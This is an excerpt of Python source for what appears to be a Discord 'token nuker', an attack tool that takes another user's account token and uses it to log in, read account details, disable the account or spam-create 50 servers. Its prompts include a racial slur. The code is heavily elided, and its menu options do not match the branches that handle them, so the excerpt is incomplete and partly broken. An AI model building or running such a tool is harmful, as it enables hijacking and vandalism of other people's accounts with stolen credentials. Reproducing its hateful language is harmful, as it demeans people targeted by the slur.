...
def tokenFuck(token):
    ...
    print(f"[{Fore.RED}+{Fore.RESET}] Sending info to oovy members... Sent.")
    ...
    for i in range(50):
        payload = {'name': f'OOVY RUNZ U {i}', 'region': 'europe', 'icon': None, 'channels': None}
    ...
    banner = f'''
       ...
       ░ ░ ░ ▒  ░ ░ ░ ▒       ░░   ▒ ▒ ░░        ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░    
           ░ ░      ░ ░        ░   ░ ░                 ░    ░     ░  ░      ░  ░   ░        
                    ...
                    [{Fore.CYAN}1{Fore.RESET}] Token fuck the token
                    [{Fore.CYAN}2{Fore.RESET}] Info on the account
                    [{Fore.CYAN}3{Fore.RESET}] Login to the token
...
def startMenu():
    print(getBanner())
    print(f'[{Fore.CYAN}>{Fore.RESET}] Pick a number', end=''); choice = str(input('  :  '))
    if choice == '0':
        print(f'[{Fore.CYAN}>{Fore.RESET}] Bitch nigga token', end=''); token = input('  :  ')
        tokenDisable(token)

    elif choice == '1':
        print(f'[{Fore.CYAN}>{Fore.RESET}] Bitch nigga token', end=''); token = input('  :  ')
        print(f'[{Fore.CYAN}>{Fore.RESET}] How much threads', end=''); threads = input('  :  ')
        Login().run(token)
